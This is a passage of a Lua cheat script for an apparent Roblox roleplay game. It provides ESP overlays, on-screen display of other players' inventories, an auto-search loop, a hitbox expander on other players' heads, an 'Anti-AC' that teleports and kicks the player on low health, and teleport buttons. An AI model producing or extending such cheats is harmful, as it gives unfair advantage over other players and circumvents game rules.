MiniHubESPSection:CreateToggle({
    Name = "ESP Nome/Vida",
    CurrentValue = ESPAtivo,
    Flag = "esp",
    Callback = function(Value)
        gerenciarESPGlobal(Value)
    end,
})

-- ========================================
--          SE√á√ÉO AUTO REVISTAR
-- ========================================
local MiniHubAutoRevSection = MiniHubTab:CreateSection("Auto Revistar")
local autoRevistarAtivo = false
local autoRevTask = nil -- Vari√°vel para a coroutine do auto revistar

-- Fun√ß√£o para o loop de auto revistar
local function autoRevistarLoop()
    while autoRevistarAtivo do
        sendRevistarCommand() -- Reutiliza a fun√ß√£o j√° criada
        task.wait(2) -- Intervalo entre as revistas
    end
    print("Loop Auto Revistar parado.")
end

-- Toggle para Auto Revistar
MiniHubAutoRevSection:CreateToggle({
    Name = "Ativar Auto Revistar (a cada 2s)",
    CurrentValue = false,
    Flag = "autorsv",
    Callback = function(Value)
        autoRevistarAtivo = Value
        if autoRevistarAtivo then
            if autoRevTask then task.cancel(autoRevTask) end -- Cancela task anterior
            autoRevTask = task.spawn(autoRevistarLoop) -- Inicia a nova task
            print("Loop Auto Revistar iniciado.")
            Rayfield:Notify({ Title = "Auto Revistar", Content = "Ativado.", Duration = 3 })
        else
            if autoRevTask then task.cancel(autoRevTask); autoRevTask = nil end -- Cancela a task se existir
            Rayfield:Notify({ Title = "Auto Revistar", Content = "Desativado.", Duration = 3 })
        end
    end,
})

-- ========================================
--          SE√á√ÉO VER ITENS UI
-- ========================================
local MiniHubVerItensSection = MiniHubTab:CreateSection("Itens dos Jogadores")
local verItensUIAtivo = false
local verItensConexoes = {} -- Armazena GUIs e conex√µes para limpeza

-- Fun√ß√£o para remover a UI de itens de um jogador
local function removerItemUI(player)
    if verItensConexoes[player] then
        if verItensConexoes[player].gui and verItensConexoes[player].gui.Parent then
            verItensConexoes[player].gui:Destroy()
        end
        -- Desconectar todos os listeners associados
        for _, conn in ipairs(verItensConexoes[player].connections or {}) do
            if conn then conn:Disconnect() end
        end
        verItensConexoes[player] = nil
    end
     -- Garante remo√ß√£o mesmo se n√£o estiver na tabela
     if player.Character and player.Character:FindFirstChild("Head") then
          local head = player.Character.Head
          local oldUi = head:FindFirstChild("ItemUI_MiniHub")
          if oldUi then oldUi:Destroy() end
     end
end

-- Fun√ß√£o para criar a UI de itens para um jogador
local function adicionarItemUI(player)
    if player == Player or not player.Character or not player.Character:FindFirstChild("Head") then
        return
    end
    removerItemUI(player) -- Remove UI antiga

    local character = player.Character
    local head = character.Head

    local gui = Instance.new("BillboardGui")
    gui.Name = "ItemUI_MiniHub"
    gui.Adornee = head
    gui.Size = UDim2.new(0, 180, 0, 70) -- Tamanho ajustado
    gui.StudsOffset = Vector3.new(0, 3.5, 0) -- Offset ajustado
    gui.AlwaysOnTop = true
    gui.Parent = head

    local name = Instance.new("TextLabel")
    name.Size = UDim2.new(1, 0, 0.3, 0)
    name.Position = UDim2.new(0, 0, 0, 0)
    name.BackgroundTransparency = 1
    name.TextColor3 = Color3.new(1, 1, 1)
    name.TextStrokeTransparency = 0.5
    name.Font = Enum.Font.SourceSansSemibold
    name.TextScaled = true
    name.Text = player.DisplayName
    name.Parent = gui

    local itens = Instance.new("TextLabel")
    itens.Size = UDim2.new(1, 0, 0.7, 0)
    itens.Position = UDim2.new(0, 0, 0.3, 0)
    itens.BackgroundTransparency = 1
    itens.TextColor3 = Color3.new(0.8, 0.8, 0.8) -- Cor mais suave
    itens.TextStrokeTransparency = 0.6
    itens.Font = Enum.Font.SourceSans
    itens.TextScaled = true
    itens.TextWrapped = true
    itens.TextXAlignment = Enum.TextXAlignment.Left
    itens.TextYAlignment = Enum.TextYAlignment.Top
    itens.Text = "Itens: Carregando..."
    itens.Parent = gui

    local connections = {} -- Tabela local para conex√µes deste jogador

    local function updateItems()
        local list = {}
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") then -- Verifica se √© ferramenta
                    table.insert(list, item.Name)
                end
            end
        end
        if player.Character then
            for _, item in ipairs(player.Character:GetChildren()) do
                if item:IsA("Tool") then -- Verifica se √© ferramenta
                    table.insert(list, item.Name)
                end
            end
        end
        if #list > 0 then
            itens.Text = "Itens: " .. table.concat(list, ", ")
        else
            itens.Text = "Itens: Nenhum"
        end
    end

    -- Conex√µes para atualizar quando itens s√£o adicionados/removidos
    local backpack = player:WaitForChild("Backpack", 5)
    if backpack then
         table.insert(connections, backpack.ChildAdded:Connect(updateItems))
         table.insert(connections, backpack.ChildRemoved:Connect(updateItems))
    end
    -- Character tamb√©m pode ter tools
     table.insert(connections, character.ChildAdded:Connect(function(child) if child:IsA("Tool") then updateItems() end end))
     table.insert(connections, character.ChildRemoved:Connect(function(child) if child:IsA("Tool") then updateItems() end end))
     table.insert(connections, character:GetAttributeChangedSignal("ToolEquipped"):Connect(updateItems)) -- Se houver atributo

    verItensConexoes[player] = {gui = gui, connections = connections}
    updateItems() -- Chama uma vez para definir o estado inicial
end

-- Fun√ß√£o para aplicar ou remover a UI de itens de todos
local verItensPlayerAddedConn = nil
local verItensPlayerRemovingConn = nil
local verItensCharacterAddedConns = {}

local function gerenciarVerItensGlobal(ativar)
    verItensUIAtivo = ativar
    if ativar then
        print("Ativando Ver Itens UI...")
         -- Aplica aos jogadores existentes
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= Player then
                if p.Character then
                    adicionarItemUI(p)
                end
                -- Conecta CharacterAdded para cada jogador existente
                 if not verItensCharacterAddedConns[p] then
                     verItensCharacterAddedConns[p] = p.CharacterAdded:Connect(function(char)
                         task.wait(0.5)
                         if verItensUIAtivo then adicionarItemUI(p) end
                     end)
                 end
            end
        end

        -- Conecta para novos jogadores
        if not verItensPlayerAddedConn then
            verItensPlayerAddedConn = Players.PlayerAdded:Connect(function(p)
                 if not verItensCharacterAddedConns[p] then
                     verItensCharacterAddedConns[p] = p.CharacterAdded:Connect(function(char)
                         task.wait(0.5)
                         if verItensUIAtivo then adicionarItemUI(p) end
                     end)
                 end
                  if p.Character and verItensUIAtivo then
                    task.wait(0.5)
                    adicionarItemUI(p)
                 end
            end)
        end
        -- Conecta para jogadores que saem
         if not verItensPlayerRemovingConn then
            verItensPlayerRemovingConn = Players.PlayerRemoving:Connect(function(p)
                 removerItemUI(p)
                 if verItensCharacterAddedConns[p] then
                     verItensCharacterAddedConns[p]:Disconnect()
                     verItensCharacterAddedConns[p] = nil
                 end
             end)
         end

    else
         print("Desativando Ver Itens UI...")
         -- Desconecta listeners globais
        if verItensPlayerAddedConn then verItensPlayerAddedConn:Disconnect(); verItensPlayerAddedConn = nil end
        if verItensPlayerRemovingConn then verItensPlayerRemovingConn:Disconnect(); verItensPlayerRemovingConn = nil end

        -- Desconecta listeners de CharacterAdded individuais
        for p, conn in pairs(verItensCharacterAddedConns) do
            if conn then conn:Disconnect() end
        end
        verItensCharacterAddedConns = {}

        -- Remove UI de todos os jogadores
        for p, data in pairs(verItensConexoes) do
            removerItemUI(p)
        end
         verItensConexoes = {} -- Limpa a tabela

    end
end

-- Toggle para Ver Itens UI
MiniHubVerItensSection:CreateToggle({
    Name = "Ver Itens UI",
    CurrentValue = verItensUIAtivo,
    Flag = "veritensui",
    Callback = function(Value)
        gerenciarVerItensGlobal(Value)
    end,
})


-- ========================================
--          SE√á√ÉO HITBOX EXPANDER
-- ========================================
local HitboxSection = Tab:CreateSection("Hitbox (PC e Mobile)")
local hitboxEnabled = false
local originalSizes = {} -- Armazena tamanhos originais {player = originalSizeVector}
local hitboxConnection = nil

-- Fun√ß√£o para definir o tamanho da hitbox (cabe√ßa)
local function setHitbox(targetPlayer, size)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        local head = targetPlayer.Character.Head
        -- Guarda o tamanho original apenas se ainda n√£o foi guardado
        if not originalSizes[targetPlayer] then
            originalSizes[targetPlayer] = head.Size
        end
        head.Size = size
        -- Efeitos visuais opcionais para indicar a hitbox expandida
        head.Transparency = 0.7
        head.Material = Enum.Material.Neon
        head.Color = Color3.fromRGB(255, 0, 0)
        head.CanCollide = false -- Desativa colis√£o para evitar problemas
    end
end

-- Fun√ß√£o para resetar a hitbox para o tamanho original
local function resetHitbox(targetPlayer)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and originalSizes[targetPlayer] then
        local head = targetPlayer.Character.Head
        head.Size = originalSizes[targetPlayer]
        -- Reseta os efeitos visuais
        head.Transparency = 0 -- Usa a transpar√™ncia padr√£o do char
        head.Material = Enum.Material.Plastic -- Ou o material padr√£o
        head.Color = Color3.fromRGB(255, 223, 196) -- Cor padr√£o da cabe√ßa (aproximada)
        head.CanCollide = true -- Reativa colis√£o
        -- Remove da tabela ap√≥s resetar
        originalSizes[targetPlayer] = nil
    end
end

-- Fun√ß√£o para gerenciar o Hitbox Expander
local function toggleHitbox(enabled)
    hitboxEnabled = enabled
    if enabled then
        print("Ativando Hitbox Expander...")
        -- Aplica aos jogadores existentes
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= Player then
                setHitbox(p, Vector3.new(5, 5, 5)) -- Tamanho expandido
            end
        end
        -- Conecta RenderStepped para manter (pode n√£o ser necess√°rio se CharacterAdded cuidar disso)
        -- Opcional: Usar CharacterAdded para aplicar a novos jogadores e quando respawnarem
        -- (J√° coberto pelos loops de ESP e Ver Itens, mas pode adicionar aqui se necess√°rio)
        -- Nota: A forma mais robusta seria conectar a CharacterAdded para todos os outros jogadores.
        if not hitboxConnection then
             hitboxConnection = RunService.RenderStepped:Connect(function()
                -- Verifica√ß√£o cont√≠nua pode ser pesada, prefira CharacterAdded
                -- Este loop pode ser removido se CharacterAdded for implementado robustamente
                 for _, p in pairs(Players:GetPlayers()) do
                     if p ~= Player and p.Character and p.Character:FindFirstChild("Head") and not originalSizes[p] then
                         -- Aplica se o jogador apareceu e ainda n√£o tem hitbox modificada
                         setHitbox(p, Vector3.new(5, 5, 5))
                     end
                 end
             end)
        end

    else
        print("Desativando Hitbox Expander...")
        if hitboxConnection then
            hitboxConnection:Disconnect()
            hitboxConnection = nil
        end
        -- Reseta para todos os jogadores que foram modificados
        for player, size in pairs(originalSizes) do
            resetHitbox(player)
        end
        originalSizes = {} -- Limpa a tabela
    end
end

-- Toggle para Hitbox Expander
Tab:CreateToggle({
    Name = "Hitbox Expander",
    Description = "Aumenta o tamanho da cabe√ßa dos outros jogadores (visual e de colis√£o).",
    CurrentValue = hitboxEnabled,
    Section = HitboxSection,
    Callback = function(Value)
        toggleHitbox(Value)
    end
})


-- ========================================
--          ANTI-AC (Kick na Morte)
-- ========================================
-- Fun√ß√£o para verificar a vida e kickar se baixa
local function verificarVidaEKick()
    local character = Player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    if not humanoid then
        -- Espera o personagem carregar caso ainda n√£o tenha carregado
        character = Player.CharacterAdded:Wait()
        humanoid = character:WaitForChild("Humanoid")
    end

    if not humanoid then
        warn("N√£o foi poss√≠vel encontrar o Humanoide do jogador para o Anti-AC.")
        return
    end

    local healthChangedConn = nil
    local diedConn = nil

    local function checkHealth(health)
        if health <= 10 and health > 0 then -- Vida baixa mas n√£o morto ainda
            print("Vida baixa detectada ("..health.."), teleportando e preparando para kick...")

            -- Desconecta para evitar m√∫ltiplos kicks
            if healthChangedConn then healthChangedConn:Disconnect(); healthChangedConn = nil end
            if diedConn then diedConn:Disconnect(); diedConn = nil end

            -- Teleporta para um local seguro (Ex: Tabacaria)
            local tpTarget = CFrame.new(-83.1141129, 13.1430578, 74.7073364)
            if character and character:FindFirstChild("HumanoidRootPart") then
                 character.HumanoidRootPart.CFrame = tpTarget
                 character.HumanoidRootPart.Anchored = true -- Tenta ancorar brevemente
                 task.wait(0.1)
                 character.HumanoidRootPart.Anchored = false
            end

            -- Espera um pouco e kicka
            task.wait(1.5) -- Reduzido para 1.5s
            Rayfield:Notify({ Title = "Anti-AC", Content = "Vida baixa, kickando...", Duration = 5 })
            task.wait(0.5)
            Player:Kick("Anti AC [Vida Baixa Detectada] (CL)")
        end
    end

     healthChangedConn = humanoid.HealthChanged:Connect(checkHealth)
     diedConn = humanoid.Died:Connect(function()
        -- Desconecta os listeners se o jogador morrer normalmente
        if healthChangedConn then healthChangedConn:Disconnect(); healthChangedConn = nil end
        if diedConn then diedConn:Disconnect(); diedConn = nil end
        print("Jogador morreu, Anti-AC desativado para esta vida.")
     end)

     -- Verifica a vida inicial
     checkHealth(humanoid.Health)
end

-- Chama a fun√ß√£o para iniciar a verifica√ß√£o
task.spawn(verificarVidaEKick) -- Usa task.spawn para n√£o bloquear


-- ========================================
--          SE√á√ÉO TELEPORTES
-- ========================================
TeleportTab:CreateParagraph({Title = "Mini Hub", Content = "por th"})
local TPSection = TeleportTab:CreateSection("TELEPORTS")

-- Fun√ß√£o auxiliar para criar bot√µes de teleporte
local function addTeleportButton(nome, cframe)
    TPSection:CreateButton({
        Name = nome,
        Callback = function()
            local character = Player.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = cframe + Vector3.new(0, 3, 0) -- Adiciona um offset Y para evitar ficar preso no ch√£o
                print("Teleportado para:", nome)
            else
                warn("N√£o foi poss√≠vel teleportar, HumanoidRootPart n√£o encontrado.")
                Rayfield:Notify({ Title = "Erro Teleporte", Content = "Personagem n√£o encontrado ou inv√°lido.", Duration = 4 })
            end
        end
    })
end

-- Adiciona os bot√µes de teleporte com as coordenadas fornecidas
addTeleportButton("Pra√ßa", CFrame.new(-291.579559, 3.26299787, 342.192535))
addTeleportButton("Posto G√°s", CFrame.new(-469.959015, 3.25349784, -54.3936005))
addTeleportButton("Hospital", CFrame.new(-543.439941, 3.26299858, 645.16864))
addTeleportButton("Tabacaria", CFrame.new(-83.1141129, 13.1430578, 74.7073364))
addTeleportButton("Garagem", CFrame.new(-466.870148, 7.64567232, 350.242737))
addTeleportButton("Concession√°ria", CFrame.new(-91.3902893, 8.07136822, 520.355347))
addTeleportButton("Gari", CFrame.new(-518.672852, 3.16749811, -1.16962147))
addTeleportButton("Imobili√°ria", CFrame.new(-284.904785, 8.26088619, -72.2896194))
addTeleportButton("PM (DP)", CFrame.new(-980.181458, 2.27553082, 467.080536))
addTeleportButton("PRF (Base)", CFrame.new(6662.24512, 36.6637421, 5047.83838))
addTeleportButton("Minera√ß√£o", CFrame.new(201.932144, 2.76136589, 145.50531))
addTeleportButton("Mec√¢nica", CFrame.new(-180.608261, 3.29813337, -532.4151))
addTeleportButton("Fazenda", CFrame.new(817.243225, 3.26249814, -87.316864))
addTeleportButton("Prefeitura", CFrame.new(-284.388458, 15.1148872, 88.0397873))
addTeleportButton("Banco", CFrame.new(-27.2709007, 11.5685892, 418.200653))
addTeleportButton("Local Ilegal", CFrame.new(12037.2705, 27.5305443, 12794.0635))
addTeleportButton("Topo Pr√©dio 1", CFrame.new(-1595.23328, 204.074341, 555.895386))
addTeleportButton("Base Devs Mini",CFrame.new(-291.579559, 3.26299787, 342.192535)) -- Mesmo da pra√ßa?

-- ========================================
--          SE√á√ÉO CONFIGURA√á√ïES
-- ========================================
local ConfigSection = ConfigTab:CreateSection("Ajustes e Otimiza√ß√µes")

-- Vari√°vel para controle do som
local soundMuted = false

-- Bot√£o FPS Boost Melhorado
ConfigSection:CreateButton({
    Name = "Ativar FPS Boost Extremo",
    Callback = function()
        local decalsEnabled = false -- Op√ß√£o para manter decals vis√≠veis
        local texturesEnabled = false -- Op√ß√£o para manter texturas vis√≠veis

        for _, v in pairs(workspace:GetDescendants()) do
            pcall(function()
                if v:IsA("BasePart") then
                    v.Material = Enum.Material.Plastic
                    v.Reflectance = 0
                    v.CastShadow = false
                    if not texturesEnabled then
                         if v:IsA("Texture") then v.Transparency = 1 end
                         if v:FindFirstChildOfClass("Texture") then v:FindFirstChildOfClass("Texture").Transparency = 1 end
                    end
                     if not decalsEnabled then
                         if v:IsA("Decal") then v.Transparency = 1 end
                         if v:FindFirstChildOfClass("Decal") then v:FindFirstChildOfClass("Decal").Transparency = 1 end
                     end
                elseif v:IsA("Decal") and not decalsEnabled then
                    v.Transparency = 1
                elseif v:IsA("Texture") and not texturesEnabled then
                     v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
                    v.Enabled = false
                elseif v:IsA("Explosion") then
                     v.BlastPressure = 0
                     v.BlastRadius = 0
                elseif v:IsA("PostEffect") then -- Remove efeitos de p√≥s-processamento
                     v.Enabled = false
                elseif v:IsA("MeshPart") then -- Simplifica malhas se poss√≠vel (reduz qualidade visual)
                     v.RenderFidelity = Enum.RenderFidelity.Performance
                     v.Material = Enum.Material.Plastic
                     v.Reflectance = 0
                elseif v:IsA("TrussPart") or v:IsA("VehicleSeat") or v:IsA("SkateboardPlatform") then -- Simplifica partes espec√≠ficas
                     v.Material = Enum.Material.Plastic
                     v.Reflectance = 0
                 end
            end)
        end

        -- Otimiza√ß√µes de Ilumina√ß√£o
         Lighting.Ambient = Color3.fromRGB(128, 128, 128)
         Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        Lighting.Brightness = 0.5
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 100000
        Lighting.FogStart = 99999
         pcall(function() Lighting.Technology = Enum.Technology.Compatibility end) -- Melhor compatibilidade/performance
         pcall(function() Lighting.ShadowSoftness = 0 end)
         for _, effect in pairs(Lighting:GetChildren()) do
             if effect:IsA("PostEffect") or effect:IsA("Atmosphere") or effect:IsA("Sky") then
                 effect.Enabled = false
             end
         end

        -- Otimiza√ß√µes de Renderiza√ß√£o
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.LevelOfDetail
        settings().Rendering.EagerBulkExecution = true -- Pode ajudar em alguns casos

        -- Desativa f√≠sica desnecess√°ria (pode quebrar alguns scripts de jogo)
        -- workspace.PhysicsSteppingMethod = Enum.PhysicsSteppingMethod.Fixed

        print("FPS Boost Extremo Ativado!")
        Rayfield:Notify({ Title = "Otimiza√ß√£o", Content = "FPS Boost Extremo Ativado.", Duration = 4 })
    end,
})

-- Toggle para Silenciar/Ativar Som
ConfigSection:CreateToggle({
    Name = "Silenciar Som do Jogo",
    CurrentValue = soundMuted,
    Callback = function(Value)
        soundMuted = Value
        SoundService.RespectFilteringEnabled = true -- Necess√°rio para alterar volumes globalmente
        local targetVolume = soundMuted and 0 or 0.5 -- Define volume como 0 ou 50%

        for _, s in pairs(SoundService:GetDescendants()) do
            if s:IsA("Sound") then
                s.Volume = targetVolume
            end
        end
         -- Alterar o volume global pode ser mais eficaz
         SoundService.MasterVolume = targetVolume -- Tenta alterar o volume mestre (pode n√£o funcionar em todos os contextos)
         game.SoundService.Volume = targetVolume -- Outra propriedade de volume

        print("Som do jogo", soundMuted and "silenciado." or "ativado (50%).")
         Rayfield:Notify({ Title = "Som", Content = soundMuted and "Jogo Silenciado." or "Som do Jogo Ativado (50%).", Duration = 3 })
    end,
})

-- Bot√£o Resetar Personagem
ConfigSection:CreateButton({
    Name = "Resetar Personagem (For√ßado)",
    Callback = function()
        local char = Player.Character
        if char then
            char:BreakJoints()
            task.wait(0.1)
            -- Tenta for√ßar a morte se BreakJoints n√£o for suficiente
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then humanoid.Health = 0 end
            print("Personagem resetado.")
             Rayfield:Notify({ Title = "Reset", Content = "Personagem resetado.", Duration = 3 })
        else
            warn("Personagem n√£o encontrado para resetar.")
        end
    end,
})

-- Bot√£o Desligar Part√≠culas (redundante com FPS boost, mas pode ser √∫til separadamente)
ConfigSection:CreateButton({
    Name = "Desligar Todas as Part√≠culas",
    Callback = function()
        local count = 0
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
                count = count + 1
            end
        end
        print(count .. " emissores de part√≠culas/efeitos desativados.")
        Rayfield:Notify({ Title = "Otimiza√ß√£o", Content = count .. " part√≠culas desativadas.", Duration = 4 })
    end,
})

-- Bot√µes para Qualidade Gr√°fica (redundante com FPS boost)
ConfigSection:CreateButton({
    Name = "Gr√°ficos Baixos (N√≠vel 1)",
    Callback = function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        print("Qualidade gr√°fica definida para N√≠vel 1.")
        Rayfield:Notify({ Title = "Gr√°ficos", Content = "Qualidade definida: Baixa (N√≠vel 1).", Duration = 3 })
    end,
})

ConfigSection:CreateButton({
    Name = "Gr√°ficos M√©dios (N√≠vel 10)", -- N√≠vel 10 √© geralmente m√©dio
    Callback = function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level10
        print("Qualidade gr√°fica definida para N√≠vel 10.")
        Rayfield:Notify({ Title = "Gr√°ficos", Content = "Qualidade definida: M√©dia (N√≠vel 10).", Duration = 3 })
    end,
})

print("Mini Hub UI Carregada e Fun√ß√µes Prontas.")
